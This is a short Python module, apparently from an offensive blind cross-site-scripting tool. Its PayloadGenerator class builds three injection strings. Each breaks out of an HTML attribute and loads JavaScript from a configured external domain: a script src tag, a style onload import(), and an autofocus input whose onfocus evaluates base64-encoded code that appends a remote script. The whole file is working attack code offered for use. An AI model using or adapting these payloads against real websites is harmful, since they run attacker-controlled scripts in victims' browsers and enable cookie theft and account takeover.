from base64 import b64encode
from modules.config import Config

class PayloadGenerator:
    def __init__(self):
        self.config = Config()
        self.payloads = []
        self.generate_payloads()

    def generate_payloads(self):
        if (self.config.domain == ''):
            print(f"Please set the domain in the config file. ({Config().config_location})")
            exit()

        base64Code = f'var a=document.createElement("script");a.src="//{self.config.domain}/";document.body.appendChild(a);'.encode('utf-8')
        base64Code =b64encode(base64Code).decode('utf-8')

        payloads = [
            f'\"\'><script src="//{self.config.domain}/xss.js"></script>',
            f'\"\'><style/onload=import("//{self.config.domain}/xss.js")>',
            f'\'\"><input on onfocus=eval(atob(this.id)) id={base64Code} autofocus>'
        ]
        self.payloads = payloads

    def get_payloads(self):
        return self.payloads